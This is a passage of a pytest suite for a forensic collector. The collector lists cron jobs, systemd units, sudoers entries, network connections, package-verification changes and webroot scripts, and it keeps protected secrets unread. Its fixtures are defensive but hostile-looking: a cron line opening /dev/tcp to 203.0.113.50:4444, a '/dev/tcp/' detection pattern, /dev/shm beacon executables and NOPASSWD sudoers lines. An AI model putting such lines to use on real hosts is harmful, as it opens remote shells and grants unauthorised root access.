        row['kind'] == 'authkey' and row['reason'] == 'unsearchable'
        for row in result.records('unknown')
    )


def test_an_unsearchable_home_reports_each_owned_check_kind(tmp_path: Path, shell: str):
    if os.geteuid() == 0:
        pytest.skip('root can search a mode-000 home fixture')
    root = _host_tree(tmp_path)
    _write(
        root,
        'home/alice/.config/systemd/user/beacon.service',
        '[Service]\nExecStart=/bin/true\n',
    )
    home = root / 'home/alice'
    home.chmod(0)
    try:
        result = _collect(tmp_path, shell, root, f'since={SINCE}')
    finally:
        home.chmod(0o700)

    unknowns = result.records('unknown')
    assert any(
        row['kind'] == 'authkey' and row['reason'] == 'unsearchable' for row in unknowns
    )
    assert any(
        row['kind'] == 'systemd_unit' and row['reason'] == 'unsearchable'
        for row in unknowns
    )


def test_cron_file_reports_times_and_hash_never_its_lines(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    command = '* * * * * root /bin/sh secret-command'
    path = _write(root, 'etc/cron.d/job', command + '\n')

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    cron = next(
        row for row in result.records('cron') if row['path'].endswith('/etc/cron.d/job')
    )
    assert cron['sha256']
    assert cron['mtime'].endswith('Z')
    assert command not in '\n'.join(result.lines)
    assert path.read_text() == command + '\n'


def test_pattern_hit_names_the_pattern_number_and_line_only(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    pattern = '/dev/tcp/'
    line = '* * * * * root sh -c exec 3<>/dev/tcp/203.0.113.50/4444'
    _write(root, 'etc/cron.d/job', 'SHELL=/bin/sh\n' + line + '\n')

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        'pattern=unmatched',
        f'pattern={pattern}',
    )

    cron = result.records('cron')[0]
    assert cron['hits'] == '2@2'
    assert pattern not in '\n'.join(result.lines)
    assert line not in '\n'.join(result.lines)


def test_pattern_hits_are_found_in_a_file_with_a_nul_byte(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    cron = root / 'etc/cron.d/binary'
    cron.write_bytes(b'prefix\x00beacon suffix\n')

    result = _collect(tmp_path, shell, root, f'since={SINCE}', 'pattern=beacon')

    record = next(
        row for row in result.records('cron') if row['path'].endswith('/binary')
    )
    assert record['hits'] == '1@1'


def test_vendor_units_are_listed_only_when_changed_since(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    _write(
        root,
        'usr/lib/systemd/system/new.service',
        '[Service]\n',
        4_102_444_800,
    )
    _write(root, 'usr/lib/systemd/system/old.service', '[Service]\n', BEFORE)
    result = _collect(tmp_path, shell, root, 'since=2099-01-01')

    paths = [row['path'] for row in result.records('systemd_unit')]
    assert any(path.endswith('/new.service') for path in paths)
    assert not any(path.endswith('/old.service') for path in paths)


def test_a_timer_unit_is_listed_like_a_service(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    _write(root, 'etc/systemd/system/beacon.timer', '[Timer]\nOnBootSec=5m\n')

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    assert any(
        row['path'].endswith('/beacon.timer') for row in result.records('systemd_unit')
    )


def test_a_user_unit_names_its_account(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    _write(
        root,
        'home/alice/.config/systemd/user/beacon.service',
        '[Service]\nExecStart=/bin/true\n',
    )

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    unit = next(
        row
        for row in result.records('systemd_unit')
        if row['path'].endswith('/beacon.service')
    )
    assert unit['account'] == 'alice'


def test_transient_and_local_share_user_units_are_collected(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    _write(root, 'run/systemd/transient/runtime.service', '[Service]\n')
    _write(
        root,
        'home/alice/.local/share/systemd/user/local.service',
        '[Service]\nExecStart=/bin/true\n',
    )

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    units = {row['path']: row['account'] for row in result.records('systemd_unit')}
    assert units['/run/systemd/transient/runtime.service'] == ''
    assert units['/home/alice/.local/share/systemd/user/local.service'] == 'alice'


def test_a_symlinked_unit_shows_its_target_and_no_hash(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    link = root / 'etc/systemd/system/beacon.service'
    link.symlink_to('/dev/null')

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    unit = next(
        row
        for row in result.records('systemd_unit')
        if row['path'].endswith('/beacon.service')
    )
    assert unit['target'] == '/dev/null'
    assert unit['sha256'] == '?'


def test_persistence_records_include_batched_package_ownership(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    log = tmp_path / 'dpkg.log'
    _write(root, 'etc/cron.d/job', '* * * * * root true\n')
    _write(root, 'etc/systemd/system/job.service', '[Service]\n')
    _write(root, 'etc/rc.local', '#!/bin/sh\ntrue\n')
    owned = (
        'base: /etc/cron.d/job\n'
        'base: /etc/systemd/system/job.service\n'
        'base: /etc/rc.local'
    )

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        DPKG_SEARCH_EXIT='0',
        DPKG_SEARCH_OUT=owned,
        DPKG_LOG=str(log),
    )

    assert result.records('cron')[0]['packaged'] == 'yes'
    assert result.records('systemd_unit')[0]['packaged'] == 'yes'
    assert result.records('rc_local')[0]['packaged'] == 'yes'
    ownership_calls = [
        line for line in log.read_text().splitlines() if line.startswith('--search ')
    ]
    assert len(ownership_calls) == 3


def test_persistence_package_ownership_has_no_and_unknown_states(
    tmp_path: Path, shell: str
):
    unowned_root = _host_tree(tmp_path / 'unowned')
    unknown_root = _host_tree(tmp_path / 'unknown')
    _write(unowned_root, 'etc/cron.d/job', '* * * * * root true\n')
    _write(unknown_root, 'etc/cron.d/job', '* * * * * root true\n')

    unowned = _collect(
        tmp_path / 'unowned-run',
        shell,
        unowned_root,
        f'since={SINCE}',
        DPKG_SEARCH_EXIT='1',
    )
    unknown = _collect(
        tmp_path / 'unknown-run',
        shell,
        unknown_root,
        f'since={SINCE}',
        tools=('ss', 'last', 'ssh-keygen'),
    )

    assert unowned.records('cron')[0]['packaged'] == 'no'
    assert unknown.records('cron')[0]['packaged'] == '?'


def test_a_systemd_unit_named_with_a_newline_stays_one_record(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    filename = 'line\nbreak.service'
    _write(root, f'etc/systemd/system/{filename}', '[Service]\n')

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    rows = [row for row in result.records('systemd_unit') if '%0A' in row['path']]
    assert len(rows) == 1
    assert _record_value(rows[0], 'path').endswith(filename.encode())


def test_systemd_unit_output_is_sorted_independent_of_creation_order(
    tmp_path: Path, shell: str
):
    roots = [_host_tree(tmp_path / 'first'), _host_tree(tmp_path / 'second')]
    for name in ('b.service', 'a.service'):
        _write(roots[0], f'etc/systemd/system/{name}', '[Service]\n')
    for name in ('a.service', 'b.service'):
        _write(roots[1], f'etc/systemd/system/{name}', '[Service]\n')

    outputs = []
    for index, root in enumerate(roots):
        result = _collect(tmp_path / f'run-{index}', shell, root, f'since={SINCE}')
        outputs.append(
            [
                row['path']
                for row in result.records('systemd_unit')
                if row['path'].endswith('.service')
            ]
        )

    assert outputs[0] == outputs[1] == sorted(outputs[0])


def test_an_established_connection_to_a_local_listener_is_preserved(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    ss_listen = 'LISTEN 0 128 0.0.0.0:443 0.0.0.0:* users:(("server",pid=10,fd=3))'
    ss_est = 'ESTAB 0 0 10.0.0.1:443 203.0.113.50:50000 users:(("fake",pid=20,fd=4))'
    _write(root, 'proc/20/comm', 'worker\n')
    (root / 'proc/20/exe').symlink_to('/usr/bin/worker')

    result = _collect(
        tmp_path, shell, root, f'since={SINCE}', SS_LISTEN=ss_listen, SS_EST=ss_est
    )

    connection = result.records('connection')[0]
    assert connection['listening'] == 'yes'
    assert connection['raddr'] == '203.0.113.50'


def test_connections_are_grouped_by_process_and_peer(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    row = 'ESTAB 0 0 10.0.0.1:50000 203.0.113.50:4444 users:(("fake",pid=20,fd=4))'
    _write(root, 'proc/20/comm', 'beacon\n')
    (root / 'proc/20/exe').symlink_to('/dev/shm/beacon')

    result = _collect(tmp_path, shell, root, f'since={SINCE}', SS_EST=f'{row}\n{row}')

    connections = result.records('connection')
    assert len(connections) == 1
    assert connections[0]['count'] == '2'


def test_process_name_comes_from_proc_not_from_ss_text(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    row = (
        'ESTAB 0 0 10.0.0.1:50000 203.0.113.50:4444 users:(("bad\\" name",pid=20,fd=4))'
    )
    _write(root, 'proc/20/comm', 'trusted-record-name\n')
    (root / 'proc/20/exe').symlink_to('/usr/bin/worker')

    result = _collect(tmp_path, shell, root, f'since={SINCE}', SS_EST=row)

    connection = result.records('connection')[0]
    assert connection['process'] == 'trusted-record-name'
    assert 'bad' not in connection['process']


@pytest.mark.parametrize('kind', ['listen', 'connection'])
def test_the_last_pid_field_wins_over_a_pid_in_the_process_name(
    tmp_path: Path, shell: str, kind: str
):
    root = _host_tree(tmp_path)
    _write(root, 'proc/20/comm', 'trusted-process\n')
    (root / 'proc/20/exe').symlink_to('/dev/shm/trusted (deleted)')
    suffix = 'users:(("x\\",pid=1,",pid=20,fd=4))'
    ss_listen = f'LISTEN 0 128 0.0.0.0:443 0.0.0.0:* {suffix}'
    ss_established = ''
    if kind == 'connection':
        ss_listen = ''
        ss_established = f'ESTAB 0 0 10.0.0.1:50000 203.0.113.50:4444 {suffix}'

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        SS_LISTEN=ss_listen,
        SS_EST=ss_established,
    )

    record = result.records(kind)[0]
    assert record['pid'] == '20'
    assert record['process'] == 'trusted-process'
    assert record['exe'] == '/dev/shm/trusted'
    assert record['deleted'] == 'yes'


def test_ipv4_mapped_socket_addresses_are_normalized(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    _write(root, 'proc/20/comm', 'worker\n')
    (root / 'proc/20/exe').symlink_to('/usr/bin/worker')
    listen = 'LISTEN 0 128 [::ffff:192.0.2.10]:443 [::]:* users:(("x",pid=20,fd=3))'
    connection = 'ESTAB 0 0 [::ffff:192.0.2.10]:50000 [::ffff:203.0.113.5]:4444 users:(("x",pid=20,fd=4))'

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        SS_LISTEN=listen,
        SS_EST=connection,
    )

    assert result.records('listen')[0]['addr'] == '192.0.2.10'
    row = result.records('connection')[0]
    assert row['laddr'] == '192.0.2.10'
    assert row['raddr'] == '203.0.113.5'


def test_a_deleted_executable_is_flagged(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    row = 'ESTAB 0 0 10.0.0.1:50000 203.0.113.50:4444 users:(("fake",pid=20,fd=4))'
    _write(root, 'proc/20/comm', 'beacon\n')
    (root / 'proc/20/exe').symlink_to('/dev/shm/.x (deleted)')

    result = _collect(tmp_path, shell, root, f'since={SINCE}', SS_EST=row)

    connection = result.records('connection')[0]
    assert connection['exe'] == '/dev/shm/.x'
    assert connection['deleted'] == 'yes'


def test_unreadable_process_metadata_makes_listener_unknown(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    row = 'LISTEN 0 128 0.0.0.0:443 0.0.0.0:* users:(("fake",pid=20,fd=3))'
    (root / 'proc/20').mkdir()

    result = _collect(tmp_path, shell, root, f'since={SINCE}', SS_LISTEN=row)

    assert any(
        unknown['kind'] == 'listen' and unknown['reason'] == 'unreadable'
        for unknown in result.records('unknown')
    )


def test_secret_process_metadata_makes_connection_unknown(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    row = 'ESTAB 0 0 10.0.0.1:50000 203.0.113.50:4444 users:(("fake",pid=20,fd=4))'
    _write(root, 'proc/20/comm', 'beacon\n')
    (root / 'proc/20/exe').symlink_to('/dev/shm/beacon')

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        'protect=/proc/20/comm',
        SS_EST=row,
    )

    assert any(
        unknown['kind'] == 'connection' and unknown['reason'] == 'secret-overlap'
        for unknown in result.records('unknown')
    )


@pytest.mark.parametrize('kind', ['listen', 'connection'])
def test_an_executable_symlink_that_readlink_cannot_read_is_unknown(
    tmp_path: Path, shell: str, kind: str
):
    root = _host_tree(tmp_path)
    _write(root, 'proc/20/comm', 'beacon\n')
    (root / 'proc/20/exe').symlink_to('/dev/shm/beacon')
    real_readlink = shutil.which('readlink')
    assert real_readlink
    readlink_fake = """case "$*" in
  (*'/proc/20/exe') exit 1;;
  (*) exec "$REAL_READLINK" "$@";;
esac"""
    ss_listen = 'LISTEN 0 128 0.0.0.0:443 0.0.0.0:* users:(("fake",pid=20,fd=3))'
    ss_established = ''
    if kind == 'connection':
        ss_listen = ''
        ss_established = (
            'ESTAB 0 0 10.0.0.1:50000 203.0.113.50:4444 users:(("fake",pid=20,fd=4))'
        )

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        extra_fakes={'readlink': readlink_fake},
        REAL_READLINK=real_readlink,
        SS_LISTEN=ss_listen,
        SS_EST=ss_established,
    )

    assert any(
        unknown['kind'] == kind
        and unknown['path'] == '/proc/20/exe'
        and unknown['reason'] == 'unreadable'
        for unknown in result.records('unknown')
    )


def test_missing_ss_makes_connection_unknown(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)

    result = _collect(
        tmp_path, shell, root, f'since={SINCE}', tools=('dpkg', 'last', 'ssh-keygen')
    )

    assert any(
        row['kind'] == 'connection' and row['reason'] == 'missing-tool:ss'
        for row in result.records('unknown')
    )


def test_dpkg_verify_lines_become_pkg_modified_with_the_conffile_flag(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        DPKG_OUT='??5?????? c /etc/ssh/sshd_config',
    )

    modified = result.records('pkg_modified')[0]
    assert modified == {
        'kind': 'pkg_modified',
        'manager': 'dpkg',
        'path': '/etc/ssh/sshd_config',
        'flags': '%3F%3F5%3F%3F%3F%3F%3F%3F',
        'conf': 'yes',
        'mtime': '?',
        'ctime': '?',
    }


def test_only_an_unknown_dpkg_digest_makes_the_mapping_unknown(shell: str):
    row = next(
        line
        for line in MAPPING.read_text().splitlines()
        if line.startswith('| `pkg_modified` |')
    )

    assert 'dpkg' in row
    assert 'digest' in row
    assert 'rpm' in row
    assert '`5`' in row
    assert 'flags contains `?`' not in row


def test_rpm_is_used_when_dpkg_is_absent(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    log = tmp_path / 'rpm.log'

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        tools=('ss', 'rpm', 'last', 'ssh-keygen'),
        RPM_OUT='S.5....T.  c /etc/ssh/sshd_config',
        RPM_LOG=str(log),
    )

    modified = result.records('pkg_modified')[0]
    assert modified['manager'] == 'rpm'
    assert modified['path'] == '/etc/ssh/sshd_config'
    assert modified['conf'] == 'yes'
    assert '--noscripts' in log.read_text().split()


@pytest.mark.parametrize('attribute', ['c', 'd', 'g', 'l', 'r'])
def test_rpm_preserves_paths_for_every_attribute_marker(
    tmp_path: Path, shell: str, attribute: str
):
    root = _host_tree(tmp_path)
    log = tmp_path / 'rpm.log'
    path = f'/opt/vendor/{attribute} file [*].conf'

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        tools=('ss', 'rpm', 'last', 'ssh-keygen'),
        RPM_OUT=f'S.5....T.  {attribute} {path}',
        RPM_LOG=str(log),
    )

    assert result.records('pkg_modified')[0]['path'] == path.replace(
        ' ', '%20'
    ).replace('[', '%5B').replace(']', '%5D').replace('*', '%2A')
    assert log.read_text().splitlines() == ['-qal', '-Va --nodeps --noscripts']


def test_rpm_ignores_non_file_diagnostics(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        tools=('ss', 'rpm', 'last', 'ssh-keygen'),
        RPM_OUT='Unsatisfied dependencies for package:\nS.5....T.    /opt/good file',
    )

    assert [row['path'] for row in result.records('pkg_modified')] == [
        '/opt/good%20file'
    ]


def test_no_package_manager_is_unknown(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)

    result = _collect(
        tmp_path, shell, root, f'since={SINCE}', tools=('ss', 'last', 'ssh-keygen')
    )

    assert any(
        row['kind'] == 'pkg_modified' and row['reason'] == 'no-package-manager'
        for row in result.records('unknown')
    )


def test_a_failing_verify_is_unknown(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)

    result = _collect(tmp_path, shell, root, f'since={SINCE}', DPKG_EXIT='2')

    assert any(
        row['kind'] == 'pkg_modified' and row['reason'] == 'failed'
        for row in result.records('unknown')
    )


def test_lists_scripts_changed_since_and_skips_older_ones(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    _write(root, 'var/www/html/new.php', '<?php echo 1; ?>\n', AFTER)
    _write(root, 'var/www/html/old.php', '<?php echo 2; ?>\n', BEFORE)
    _write(root, 'var/www/html/new.txt', 'not a script\n', AFTER)

    result = _collect(tmp_path, shell, root, f'since={SINCE}', 'webroot=/var/www/html')

    paths = [row['path'] for row in result.records('webroot_file')]
    assert any(path.endswith('/new.php') for path in paths)
    assert not any(path.endswith('/new.txt') for path in paths)


def test_a_backdated_mtime_is_still_caught_by_ctime(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    _write(root, 'var/www/html/backdated.php', '<?php echo 1; ?>\n', BEFORE)

    result = _collect(tmp_path, shell, root, f'since={SINCE}', 'webroot=/var/www/html')

    assert any(
        row['path'].endswith('/backdated.php') for row in result.records('webroot_file')
    )


def test_htaccess_and_user_ini_count_as_scripts(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    _write(root, 'var/www/html/.htaccess', 'SetHandler application/x-httpd-php\n')
    _write(root, 'var/www/html/.user.ini', 'auto_prepend_file=x.php\n')

    result = _collect(tmp_path, shell, root, f'since={SINCE}', 'webroot=/var/www/html')

    paths = {Path(row['path']).name for row in result.records('webroot_file')}
    assert paths == {'.htaccess', '.user.ini'}


def test_more_than_limit_files_shows_limit_and_a_cap(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    for index in range(205):
        _write(root, f'var/www/html/{index:03}.php', '<?php ?>\n')

    result = _collect(tmp_path, shell, root, f'since={SINCE}', 'webroot=/var/www/html')

    assert len(result.records('webroot_file')) == 200
    cap = next(row for row in result.records('cap') if row['kind'] == 'webroot_file')
    assert cap['total'] == '205'
    assert cap['shown'] == '200'


def test_a_missing_webroot_is_unknown(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)

    result = _collect(tmp_path, shell, root, f'since={SINCE}', 'webroot=/missing')

    assert any(
        row['kind'] == 'webroot_file' and row['reason'] == 'not-a-directory'
        for row in result.records('unknown')
    )


@pytest.mark.parametrize(
    ('kind', 'directory', 'relative', 'content', 'extra_args'),
    [
        (
            'webroot_file',
            'var/www/html',
            'var/www/html/shell.php',
            '<?php ?>\n',
            ('webroot=/var/www/html',),
        ),
        (
            'systemd_unit',
            'etc/systemd/system',
            'etc/systemd/system/beacon.service',
            '[Service]\n',
            (),
        ),
        ('cron', 'etc/cron.d', 'etc/cron.d/beacon', '* * * * * root true\n', ()),
        (
            'sudoers',
            'etc/sudoers.d',
            'etc/sudoers.d/operator',
            'alice ALL=(ALL) ALL\n',
            (),
        ),
    ],
)
def test_an_unlistable_scanned_directory_is_unknown(
    tmp_path: Path,
    shell: str,
    kind: str,
    directory: str,
    relative: str,
    content: str,
    extra_args: tuple[str, ...],
):
    if os.geteuid() == 0:
        pytest.skip('root can list a mode-0111 directory fixture')
    root = _host_tree(tmp_path)
    _write(root, relative, content)
    locked = root / directory
    locked.chmod(0o111)
    try:
        result = _collect(tmp_path, shell, root, f'since={SINCE}', *extra_args)
    finally:
        locked.chmod(0o700)

    assert any(
        unknown['kind'] == kind and unknown['reason'] == 'unsearchable'
        for unknown in result.records('unknown')
    )


def test_a_secret_is_stat_only_and_its_content_never_appears(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    secret = 'DATABASE_PASSWORD=never-print-this'
    _write(root, 'app/.env', secret + '\n')

    result = _collect(tmp_path, shell, root, f'since={SINCE}', 'protect=/app/.env')

    record = result.records('secret')[0]
    assert record['exists'] == 'yes'
    assert record['path'].endswith('/app/.env')
    assert secret not in '\n'.join(result.lines)


def test_atime_mode_comes_from_the_longest_mount_prefix(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    _write(root, 'app/.env', 'secret\n')

    result = _collect(tmp_path, shell, root, f'since={SINCE}', 'protect=/app/.env')

    secret = result.records('secret')[0]
    assert secret['mount'] == '/app'
    assert secret['atime_mode'] == 'noatime'


def test_mountinfo_escapes_are_decoded_before_longest_prefix_matching(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    (root / 'proc/self/mountinfo').write_text(
        '1 0 0:1 / / rw,relatime - ext4 /dev/root rw\n'
        '2 1 0:1 /app\\040data /app\\040data rw,noatime - ext4 /dev/root rw\n'
    )
    _write(root, 'app data/.env', 'secret\n')

    result = _collect(tmp_path, shell, root, f'since={SINCE}', 'protect=/app data/.env')

    secret = result.records('secret')[0]
    assert _record_value(secret, 'mount') == b'/app data'
    assert secret['atime_mode'] == 'noatime'


def test_a_secret_path_with_a_space_is_statted_as_one_path(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    _write(root, 'app/my secret', 'value\n')

    result = _collect(tmp_path, shell, root, f'since={SINCE}', 'protect=/app/my secret')

    assert len(result.records('secret')) == 1
    secret = result.records('secret')[0]
    assert _record_value(secret, 'path') == b'/app/my secret'
    assert secret['exists'] == 'yes'
    assert secret['mount'] == '/app'


def test_a_secret_path_with_a_colon_keeps_its_metadata_and_path(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    _write(root, 'app/a:b', 'value\n')

    result = _collect(tmp_path, shell, root, f'since={SINCE}', 'protect=/app/a:b')

    assert len(result.records('secret')) == 1
    secret = result.records('secret')[0]
    assert secret['path'] == '/app/a:b'
    assert secret['exists'] == 'yes'
    assert secret['atime'].endswith('Z')
    assert secret['mtime'].endswith('Z')
    assert secret['ctime'].endswith('Z')


def test_home_relative_secret_expands_for_every_account(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    _write(root, 'root/.aws/credentials', 'root-secret\n')
    _write(root, 'home/alice/.aws/credentials', 'alice-secret\n')

    result = _collect(
        tmp_path, shell, root, f'since={SINCE}', 'protect=~/.aws/credentials'
    )

    records = result.records('secret')
    assert {row['account'] for row in records} == {'root', 'alice'}
    assert all(row['exists'] == 'yes' for row in records)


def test_a_glob_secret_lists_each_match_and_an_unmatched_glob_is_exists_no(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    _write(root, 'app/.env', 'one\n')
    _write(root, 'app/.env.prod', 'two\n')

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        'protect=/app/.env*',
        'protect=/app/missing*',
    )

    records = result.records('secret')
    assert sum(row['exists'] == 'yes' for row in records) == 2
    assert sum(row['exists'] == 'no' for row in records) == 1


def test_a_secret_overlap_is_not_opened_by_another_check(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    _write(root, 'var/www/html/secret.php', '<?php echo getenv("PASSWORD"); ?>\n')

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        'webroot=/var/www/html',
        'protect=/var/www/html/secret.php',
    )

    assert any(
        row['kind'] == 'webroot_file' and row['reason'] == 'secret-overlap'
        for row in result.records('unknown')
    )
    assert not result.records('webroot_file')


@pytest.mark.parametrize(
    ('kind', 'link', 'content', 'extra_args'),
    [
        ('sudoers', 'etc/sudoers.d/link', 'alice ALL=(ALL) NOPASSWD: ALL\n', ()),
        ('cron', 'etc/cron.d/link', '* * * * * root true\n', ()),
        (
            'webroot_file',
            'var/www/html/link.php',
            '<?php echo "never-open"; ?>\n',
            ('webroot=/var/www/html',),
        ),
    ],
)
def test_a_symlink_to_a_secret_is_never_opened(
    tmp_path: Path,
    shell: str,
    kind: str,
    link: str,
    content: str,
    extra_args: tuple[str, ...],
):
    root = _host_tree(tmp_path)
    target = _write(root, 'app/.env', content)
    linked = root / link
    linked.parent.mkdir(parents=True, exist_ok=True)
    linked.symlink_to(target)

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        *extra_args,
        'protect=/app/.env',
    )

    assert any(
        row['kind'] == kind
        and row['path'] == '/' + link
        and row['reason'] == 'secret-overlap'
        for row in result.records('unknown')
    )
    assert not any(row.get('path') == '/' + link for row in result.records(kind))


def test_a_secret_fifo_reached_through_sudoers_is_never_opened(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    fifo = root / 'app/secret-fifo'
    os.mkfifo(fifo)
    (root / 'etc/sudoers.d/fifo').symlink_to(fifo)
    opened = threading.Event()
    stopped = threading.Event()

    def offer_content() -> None:
        while not stopped.is_set():
            try:
                descriptor = os.open(fifo, os.O_WRONLY | os.O_NONBLOCK)
            except OSError:
                time.sleep(0.01)
                continue
            opened.set()
            os.write(descriptor, b'alice ALL=(ALL) NOPASSWD: ALL\n')
            os.close(descriptor)
            return

    writer = threading.Thread(target=offer_content, daemon=True)
    writer.start()
    try:
        result = _collect(
            tmp_path,
            shell,
            root,
            f'since={SINCE}',
            'protect=/app/secret-fifo',
        )
    finally:
        stopped.set()
        writer.join(timeout=1)

    assert not opened.is_set()
    assert any(
        row['kind'] == 'sudoers'
        and row['path'] == '/etc/sudoers.d/fifo'
        and row['reason'] == 'secret-overlap'
        for row in result.records('unknown')
    )


def test_an_absolute_secret_is_statted_before_account_files_are_read(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    passwd = root / 'etc/passwd'
    os.utime(passwd, (BEFORE, AFTER))

    result = _collect(tmp_path, shell, root, f'since={SINCE}', 'protect=/etc/passwd')

    secret = result.records('secret')[0]
    assert secret['atime'] == '2025-07-31T22:13:20Z'
    assert any(
        row['kind'] == 'account' and row['reason'] == 'secret-overlap'
        for row in result.records('unknown')
    )
    assert not result.records('account')


@pytest.mark.parametrize(
    ('kind', 'relative', 'content', 'extra_args'),
    [
        ('account', 'etc/shadow', 'alice:$6$secret:20700::::::\n', ()),
        ('sudoers', 'etc/sudoers.d/secret', 'alice ALL=(ALL) NOPASSWD: ALL\n', ()),
        (
            'authkey',
            'home/alice/.ssh/authorized_keys',
            'ssh-ed25519 AAAAsecret comment\n',
            (),
        ),
        ('cron', 'etc/cron.d/secret', '* * * * * root secret\n', ()),
        (
            'systemd_unit',
            'etc/systemd/system/secret.service',
            '[Service]\nExecStart=secret\n',
            (),
        ),
        ('rc_local', 'etc/rc.local', '#!/bin/sh\nsecret\n', ()),
        (
            'webroot_file',
            'var/www/html/secret.php',
            '<?php secret(); ?>\n',
            ('webroot=/var/www/html',),
        ),
    ],
)
def test_every_content_reader_honors_secret_overlap(
    tmp_path: Path,
    shell: str,
    kind: str,
    relative: str,
    content: str,
    extra_args: tuple[str, ...],
):
    root = _host_tree(tmp_path)
    _write(root, relative, content)
    logical = '/' + relative

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        *extra_args,
        f'protect={logical}',
    )

    assert any(
        row['kind'] == kind
        and row['path'] == logical
        and row['reason'] == 'secret-overlap'
        for row in result.records('unknown')
    )


def test_package_verification_does_not_hash_a_named_secret(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    _write(root, 'app/.env', 'secret\n')
    log = tmp_path / 'dpkg.log'

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        'protect=/app/.env',
        DPKG_OUT='??5?????? /app/.env',
        DPKG_SEARCH_EXIT='0',
        DPKG_LOG=str(log),
    )

    assert not result.records('pkg_modified')
    assert any(
        row['kind'] == 'pkg_modified' and row['reason'] == 'secret-overlap'
        for row in result.records('unknown')
    )
    calls = log.read_text()
    assert '--search' in calls
    assert '--verify' not in calls


def test_package_verification_does_not_follow_a_packaged_alias_to_a_secret(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    secret = _write(root, 'app/.env', 'secret\n')
    (root / 'etc/packaged-alias').symlink_to(secret)
    log = tmp_path / 'dpkg.log'

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        'protect=/app/.env',
        DPKG_SEARCH_EXIT='1',
        DPKG_SELECTIONS='base hold',
        DPKG_LISTFILES='/etc/packaged-alias',
        DPKG_LOG=str(log),
    )

    assert not result.records('pkg_modified')
    assert any(
        row['kind'] == 'pkg_modified' and row['reason'] == 'secret-overlap'
        for row in result.records('unknown')
    )
    assert '--get-selections' in log.read_text()
    assert '--listfiles base' in log.read_text()
    assert '--verify' not in log.read_text()


def test_package_verification_does_not_follow_a_packaged_fifo_alias_to_a_secret(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    fifo = root / 'app/secret-fifo'
    os.mkfifo(fifo)
    (root / 'etc/packaged-alias').symlink_to(fifo)
    log = tmp_path / 'dpkg.log'

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        'protect=/app/secret-fifo',
        DPKG_SEARCH_EXIT='1',
        DPKG_SELECTIONS='base hold',
        DPKG_LISTFILES='/etc/packaged-alias',
        DPKG_LOG=str(log),
    )

    assert not result.records('pkg_modified')
    assert any(
        row['kind'] == 'pkg_modified' and row['reason'] == 'secret-overlap'
        for row in result.records('unknown')
    )
    assert '--verify' not in log.read_text()


def test_a_web_file_named_with_a_newline_stays_one_record(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    filename = 'line\nbreak.php'
    _write(root, f'var/www/html/{filename}', '<?php ?>\n')

